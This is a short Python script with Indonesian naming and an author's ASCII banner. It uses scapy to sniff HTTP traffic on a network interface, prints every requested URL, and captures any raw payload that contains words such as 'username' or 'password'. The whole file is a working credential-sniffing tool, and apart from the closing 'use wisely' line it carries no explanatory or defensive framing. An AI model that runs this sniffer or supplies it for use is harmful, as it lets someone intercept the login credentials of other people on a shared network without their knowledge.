#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def intip_nuz(intface):
    scapy.sniff(iface=intface, store=False, prn=prosesintip_nuz)

def dapeturl_nuz(kardus):
    return kardus[http.HTTPRequest].Host + kardus[http.HTTPRequest].Path

def dapetlogin_nuz(kardus):
    if kardus.haslayer(scapy.Raw):
        load = str(kardus[scapy.Raw].load)
        katakunci = ["username", "user", "login", "password", "pass"]
        for katakunci1 in katakunci:
            if katakunci1 in load:
                return load

def prosesintip_nuz(kardus):
    if kardus.haslayer(http.HTTPRequest):
        url = dapeturl_nuz(kardus)
        print("PERMINTAAN HTTP >>> " + url.decode())

        infologin = dapetlogin_nuz(kardus)
        if infologin:
            print("\n\nPASSWORD/USERNAME >>> " + infologin + "\n\n")

intip_nuz("eth0")
penutupan = '''
    dibuat dengan niat oleh 
     ______   _ _   _ _   _ _______________
    |__  / | | | \ | | | | |__  /__  /__  /
      / /| | | |  \| | | | | / /  / /  / / 
     / /_| |_| | |\  | |_| |/ /_ / /_ / /_ 
    /____|\___/|_| \_|\___//____/____/____|

    https://steamcommunity.com/id/zunuzzz/

    =========GUNAKAN DENGAN BIJAK=========
    '''

print(penutupan)